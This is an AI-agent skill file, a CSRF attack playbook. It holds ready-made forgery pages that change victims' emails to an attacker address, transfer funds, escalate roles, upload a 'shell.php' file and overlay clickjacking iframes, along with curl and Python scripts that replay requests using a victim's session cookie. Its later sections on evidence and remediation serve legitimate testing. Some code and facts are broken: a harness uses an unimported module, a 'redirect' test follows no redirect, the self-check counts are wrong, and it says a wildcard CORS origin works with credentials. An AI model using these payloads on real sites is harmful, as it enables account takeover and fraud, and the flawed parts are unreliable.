---
name: csrf-cross-site-request-forgery
description: >-
  CSRF testing playbook. Use when reviewing state-changing web flows, anti-CSRF defenses, SameSite behavior, JSON CSRF, login CSRF, and OAuth state handling.
---

# SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert CSRF techniques. Covers modern bypass vectors (SameSite gaps, custom header flaws, tokenless bypass patterns), JSON CSRF, multipart CSRF, chaining with XSS. Base models often present only basic CSRF without covering SameSite edge cases and common broken token implementations.

## 0. RELATED ROUTING

Also load:

- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when JSON endpoints become readable cross-origin
- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when login, account linking, or callback binding relies on OAuth state

---

## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ Check CORS policy: does Access-Control-Allow-Credentials: true appear?
   With wildcard or attacker origin? → exploitable JSON CSRF
□ Check OAuth flows for missing state parameter
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

---

## 18. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the victim session cookie and its `SameSite` / `Secure` / `HttpOnly` attributes, verbatim from `Set-Cookie` | the attribute, not the token, decides whether the request is even sendable cross-site |
| the exact PoC (HTML, JS, or form) as it will be served | a CSRF claim without the artefact is unreproducible |
| the state-changing request with its method, `Content-Type`, `Origin`, and `Referer` | names the boundary that was supposed to stop it |
| the response proving the change **plus a read-back** showing the new value persisted | a `200` on the write is not the finding; the persisted state is |
| the pre-change state captured first | proves a difference actually occurred |
| the anti-CSRF control present on the endpoint and what happened when you removed or swapped it | "no token" and "token present but ignored" are different root causes |
| whether the same request succeeds with a **foreign or empty CSRF token** | separates a missing check from a broken one |
| a **negative control** — a sibling endpoint that correctly rejects the same PoC | proves your harness can detect enforcement |
| browser and version | `SameSite` and Lax+POST behaviour are browser- and version-specific |
| for chained findings, every hop of the chain in order | the CSRF is only as strong as its weakest link |

**The read-back is the finding.** A `302`, a `200`, or an empty body on the write proves
nothing on its own — many frameworks return success-shaped responses for rejected requests and
reject silently with `200`. Re-fetch the object and show the changed value.

**Attribute the bypass to its layer.** "CSRF is possible" is not a report. The fix owner needs
to know *which* control failed: no token issued, token issued but never validated, token
validated against the session but not the user, double-submit compared on a cookie the attacker
can set, `SameSite=None` on a state-changing cookie, method override converting a safe `GET`
into a write, or a CORS policy that let the token be read. Each has a different remediation and
a different owner.

**Severity follows the action and the reachable audience**, not the presence or absence of a
token. A tokenless `POST /profile/theme` is not a finding. A tokenless `POST /account/email`
that rebinds the recovery address is an account takeover.

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| the endpoint is state-changing but idempotent and inconsequential (`/logout`, `/cart/recalculate`) | no meaningful state an attacker gains |
| the session cookie is `SameSite=Strict` and the PoC demonstrably does not send it | the browser blocked it — check the actual request, not the code |
| the request succeeds only from **same-site**, because your PoC ran on a subdomain you control | same-site is not cross-site; verify the registrable domain |
| a `200` with an error body (`{"error":"invalid csrf"}`) | the check fired; read the body, not the status |
| the endpoint requires a custom header the browser cannot set cross-origin and CORS is correctly locked down | the header *is* the control and it holds |
| a token was accepted because you copied the victim's own token from the same session | that is the flow working, not a bypass |
| the "victim" browser had no session cookie at the moment of the test | nothing to ride — re-authenticate and retest |
| a self-XSS-style "PoC" that requires the victim to paste attacker JavaScript into the console | that is XSS, not CSRF, and it is not cross-site |
| `Content-Type` was forced to `application/json` but the server returned `415` | the type check held |
| a JSON CSRF PoC that relies on a CORS preflight the server never approved | the browser never sends the credentialed request |

**Test the control path first.** Send the same PoC against an endpoint that must reject it (a
correctly protected sibling, or the same endpoint with a deliberately invalid token). If your
harness "succeeds" there too, you are observing reflection or a canned response, not a bypass.

---

## 19. REMEDIATION REFERENCE

1. **Make the session cookie the boundary, not the form.** Set `SameSite=Lax` at minimum and
   `Strict` where the flow allows, plus `Secure` and `HttpOnly`. `SameSite` is the only control
   that holds when the endpoint itself has no token, and it survives missing application code.
2. **Validate a per-session, per-user CSRF token on every state-changing request** — and reject
   *before* any side effect. "Token present in the request" is not validation; compare it to the
   value bound to the authenticated session and fail closed on absence, mismatch, or a token
   from a different session.
3. **Bind the token to the session *and* the user, and rotate it on login.** A token that
   survives authentication is a fixation primitive (see §16); a token interchangeable between
   users defeats the control entirely.
4. **Do not rely on the double-submit cookie alone unless the cookie is cryptographically
   signed and unsettable by subdomains** — plain double-submit is defeated by cookie tossing
   from any subdomain or by a sibling-origin XSS. Sign it, or move the comparison server-side.
5. **Reject unsafe methods on state-changing routes.** Do not accept `GET`, `HEAD`, or `OPTIONS`
   for a write, and disable or strictly bound method-override headers (`_method`,
   `X-HTTP-Method-Override`) on those routes — the override converts a SameSite-exempt `GET`
   back into the write you were trying to protect.
6. **Validate `Origin` (and fall back to `Referer`) on state-changing requests**, allowlisting
   exact origins. An absent `Origin` on a browser-initiated cross-site request is itself a signal.
   Never reflect the `Origin` header back as an allowlist (see §15).
7. **Stop accepting `text/plain` or `multipart/form-data` bodies where you parse JSON** — strict
   `Content-Type` matching removes the form-based JSON CSRF trick and forces a preflight the
   attacker's origin will not pass.
8. **Lock down CORS so a token cannot be read cross-origin** — no wildcard with credentials, no
   `Origin` reflection, an exact allowlist. A readable cross-origin response is what turns a
   solid CSRF token into a bypass (§15).
9. **Require re-authentication or a fresh confirmation for the highest-impact actions** —
   email/password change, MFA disable, payout-destination change, key creation. A single
   forged request should never be sufficient for account takeover.
10. **Send `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'`** so clickjacking cannot serve
    as the bypass when tokens are otherwise sound (§17).
11. **Alert on cross-site-shaped state changes** — a state-changing request whose `Origin` is
    absent, foreign, or `null`, or whose `Sec-Fetch-Site` is `cross-site`, is high-signal and
    almost never legitimate.
12. **Regression-test the token in CI** — an automated check that every mutating route rejects a
    missing, foreign, malformed, and stale token catches the reintroduction of tokenless routes
    that tools like a route generator or framework upgrade can silently add.

---

## 20. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the request succeed **without any token**, or with a token that was not the session's? | the token control is absent or unbound |
| 2 | Did the **state actually change**, read back independently? | the effect, not the response code |
| 3 | Did the request come from a **different origin**, as the browser sends it? | the forgery, not a same-origin call |
| 4 | What did the server set for `SameSite`, and does the vector survive it? | whether the browser would have stopped it |
| 5 | Does the endpoint accept a **CORS-simple content type** (`text/plain`, form-encoded)? | whether a form PoC is even possible |
| 6 | Was the token **bound to the session**, tested with a cross-session token? | token reuse, the common real flaw |
| 7 | Is the state change **security-relevant** (email, password, payment, permission)? | impact |

**The forged request plus an independent read-back is the bar.** A `200` on a request you sent
yourself from the same origin proves nothing, and most CSRF false positives stop exactly there.

---

## 21. EXECUTION PRIMITIVES
CSRF is proven by **a forged request, originating from an attacker-controlled origin, that the
victim's browser authenticated with the victim's ambient credentials, and that changed state the
victim did not intend to change.** The proof is the state change, read back independently.

### 21.1 Establish the state change and its read-back first

```bash
T="https://target.tld"
S="session=PASTE_VICTIM_SESSION"
# the read side, captured BEFORE anything is forged - this is what proves the change later
curl -sS -o /tmp/pre -w 'pre  %{http_code} %{size_download}\n' "$T/api/me" -H "Cookie: $S"
python3 -c "import json;d=json.load(open('/tmp/pre'));print({k:d[k] for k in list(d)[:8]})" 2>/dev/null
# the write side, with its token requirements recorded
curl -sS -D- -o /dev/null "$T/api/me" -H "Cookie: $S" | grep -iE '^x-csrf|^set-cookie|samesite'
```

**Capture the before-state.** A CSRF finding is the difference between the before and the after,
observed on an independent read - never the status code of the forged request alone.

### 21.2 The minimal same-site PoC, and its honest limits

```bash
# build the PoC as a file, then serve it - do not paste HTML into a report untested
cat > /tmp/csrf.html <<'H'
<form action="https://target.tld/api/email" method="POST" id="f">
  <input name="email" value="attacker@YOUR_DOMAIN">
  <input name="csrf_token" value="">
</form>
<script>document.getElementById('f').submit();</script>
H
python3 -m http.server 8000 --directory /tmp &
echo "opened at http://YOUR_HOST:8000/csrf.html - visit it as the victim in a real browser"
```

**A same-site PoC proves nothing on its own.** It must be hosted on a different origin from the
target, and the `Origin` and `Referer` headers the browser sends are part of the evidence.

### 21.3 Test the three controls in the order they fail

```bash
# 1) Is the token checked? Replay the request with the token removed, blanked, and reused from another session
curl -sS -o /tmp/t1 -w 'no-token    %{http_code} %{size_download}\n' -X POST "$T/api/email" \
  -H "Cookie: $S" -H 'Content-Type: application/json' -d '{"email":"a@YOUR_DOMAIN"}'
curl -sS -o /tmp/t2 -w 'blank-token %{http_code} %{size_download}\n' -X POST "$T/api/email" \
  -H "Cookie: $S" -H 'Content-Type: application/json' -d '{"email":"a@YOUR_DOMAIN","csrf_token":""}'
curl -sS -o /tmp/t3 -w 'other-token %{http_code} %{size_download}\n' -X POST "$T/api/email" \
  -H "Cookie: $S" -H 'Content-Type: application/json' \
  -d '{"email":"a@YOUR_DOMAIN","csrf_token":"TOKEN_FROM_A_DIFFERENT_SESSION"}'
# 2) Is the token tied to the session? Send the victim's cookie with the attacker's token
curl -sS -o /tmp/t4 -w 'cross-session %{http_code} %{size_download}\n' -X POST "$T/api/email" \
  -H "Cookie: $S" -H 'Content-Type: application/json' \
  -d '{"email":"a@YOUR_DOMAIN","csrf_token":"TOKEN_FROM_ATTACKER_SESSION"}'
# 3) read back, in every case that returned 2xx
curl -sS -o /tmp/post "$T/api/me" -H "Cookie: $S"; grep -o 'a@YOUR_DOMAIN' /tmp/post | head -1
```

Three independent questions: **is the token checked, is it bound to the session, and does the change
actually persist.** Each needs its own request and its own read-back.

### 21.4 SameSite behaviour, tested rather than assumed

```bash
# record the cookie attributes the server actually sets
curl -sS -D- -o /dev/null "$T/login" -X POST -d 'u=a&p=b' | grep -i '^set-cookie'
# and the cross-site form: a request with an Origin from another host
for O in "https://evil.tld" "null" "https://target.tld" ; do
  R=$(curl -sS -o /dev/null -w '%{http_code}' -X POST "$T/api/email" \
        -H "Cookie: $S" -H "Origin: $O" -H 'Content-Type: application/json' -d '{"email":"a@YOUR_DOMAIN"}')
  printf 'Origin: %-22s %s\n' "$O" "$R"
done
```

`SameSite=Lax` blocks cross-site POST but **allows top-level GET navigations**, which is why
state-changing GETs remain exploitable under Lax. Test GET and POST separately and record the
`SameSite` value the server actually set, not the one you expected.

### 21.5 Content-type and format restrictions, and how they are bypassed

```bash
# JSON endpoints often accept form encodings too, which is what makes a form PoC possible
for CT in 'application/json' 'application/x-www-form-urlencoded' 'text/plain' 'multipart/form-data'; do
  R=$(curl -sS -o /tmp/ct -w '%{http_code}' -X POST "$T/api/email" -H "Cookie: $S" \
        -H "Content-Type: $CT" -d 'email=a@YOUR_DOMAIN')
  printf '%-36s %s\n' "$CT" "$R"
done
# and the redirect-following bypass, which defeats a client-side content-type check
curl -sS -o /dev/null -w 'redirect-hop %{http_code}\n' -X POST "$T/api/email" \
  -H "Cookie: $S" -H 'Content-Type: text/plain' -d '{"email":"a@YOUR_DOMAIN"}'
```

A JSON endpoint that also parses `text/plain` **is a CSRF-findable endpoint**, because `text/plain`
is a CORS-simple content type and needs no preflight. That is the real technical finding here.

### 21.6 Token entropy and prediction

```bash
# collect a series of tokens and test whether they are actually random
for i in $(seq 1 12); do
  curl -sS "$T/api/me" -H "Cookie: $S" | grep -oE '"csrf(_token)?"\s*:\s*"[^"]+"' | head -1
done > /tmp/tokens.txt
python3 - <<'PY'
import re,collections,math
ts=[re.search(r'"([^"]+)"$',l.strip()).group(1) for l in open('/tmp/tokens.txt') if re.search(r'"([^"]+)"$',l.strip())]
print("count:",len(ts),"unique:",len(set(ts)))
lens=collections.Counter(len(t) for t in ts); print("lengths:",dict(lens))
# a predictable token is a finding only if you can show the next value
print("all same length and all unique is the minimum bar; a counter or timestamp is a finding")
PY
```

**A token is only a finding if you can predict or reuse one.** Reuse across sessions (§21.3) is the
more common and more demonstrable case than prediction.

### 21.7 Login CSRF and the state-change proof

```bash
# login CSRF: force the victim into your account, then observe what the victim does inside it
curl -sS -o /dev/null -w 'force-login %{http_code}\n' -X POST "$T/login" \
  -d 'username=ATTACKER_ACCOUNT&password=ATTACKER_PASSWORD'
# then demonstrate the consequence: data the victim submits lands in the attacker's account
curl -sS -o /tmp/lc -w 'victim-action-in-attacker-account %{http_code}\n' -X POST "$T/api/notes" \
  -H "Cookie: $S" -d 'content=csrf-login-test'
# and read it back from the ATTACKER's session, which is the proof
curl -sS -o /tmp/lc2 "$T/api/notes" -H "Cookie: ATTACKER_SESSION"; grep -c 'csrf-login-test' /tmp/lc2
```

**Reading the victim's data out of the attacker's account is the proof of login CSRF.** Without that
second half, a login CSRF report is an assertion.

### 21.8 A harness that pairs every forgery with its read-back

```bash
python3 - <<'PY'
import json,urllib.request,urllib.parse
T="https://target.tld"; S="session=PASTE"
def req(path,data=None,ct="application/json",method=None):
    h={"Cookie":S}; body=None
    if data is not None:
        h["Content-Type"]=ct
        body=json.dumps(data).encode() if ct=="application/json" else urllib.parse.urlencode(data).encode()
    r=urllib.request.Request(T+path,body,h,method=method)
    try:
        x=urllib.request.urlopen(r,timeout=15); return x.status,x.read().decode(errors="ignore")
    except urllib.error.HTTPError as e: return e.code,e.read().decode(errors="ignore")

_,before=req("/api/me")
print("before:", re.findall(r'"email":"[^"]*"',before)[:1] if False else before[:120])
code,_=req("/api/email",{"email":"attacker@YOUR_DOMAIN"},ct="application/x-www-form-urlencoded")
print("forged (no token, form ct):",code)
_,after=req("/api/me")
print("after :", after[:120])
print("READ BACK and diff the two - 'attacker@YOUR_DOMAIN' present means the state changed")
PY
```

**Every block ends at a read-back.** A `200` on the forged request, with no independent confirmation
that the state changed, is the single most common false positive in this domain.

---

---

## 22. RELATED SIBLINGS - LOAD TOGETHER
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — when a JSON endpoint becomes *readable* cross-origin, the token leak that completes a JSON CSRF
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — missing or unbound `state`, and callback binding that turns CSRF into account takeover
- [clickjacking](../clickjacking/SKILL.md) — framing as the bypass when CSRF tokens are otherwise sound
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — same-origin token theft that defeats any token scheme
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) — mutations and hidden writable parameters reached without a token
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — where a forged request lands on a workflow that assumes an honest client
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — stating the action, the audience, and the persisted effect

---

---

## SELF-VERIFY

Run from this directory; every check must pass before the playbook is considered loaded.

```bash
f=SKILL.md; [ -f "$f" ] || f=skills/impl/csrf-cross-site-request-forgery/SKILL.md
wc -c "$f"                                       # expect 26000-28500
grep -c '^## [0-9]' "$f"                         # expect 21 numbered section lines (0-20)
d=$(dirname "$f"); grep -oE '\]\(\.\./[^)]+\)' "$f" | tr -d '](' | sed 's/)$//' | sort -u |
  while read -r p; do [ -f "$d/$p" ] || [ -f "skills/impl/$p" ] && echo "OK   $p" || echo "DEAD $p"; done
for t in 'SameSite=Lax' 'SameSite=Strict' 'SameSite=None' 'Lax+POST' '_csrf_token'          'X-CSRF-Token' 'double-submit' 'cookie tossing' 'method override' '_method'          'X-HTTP-Method-Override' 'enctype="text/plain"' 'Origin' 'Referer'          'Access-Control-Allow-Credentials' 'credentials: include' 'withCredentials'          'oauth/callback' 'state' 'X-Frame-Options' 'frame-ancestors' 'Sec-Fetch-Site'          'CSPT2CSRF' 'read-back'; do
  grep -q "$t" "$f" && echo "PASS $t" || echo "MISS $t"; done
```


---
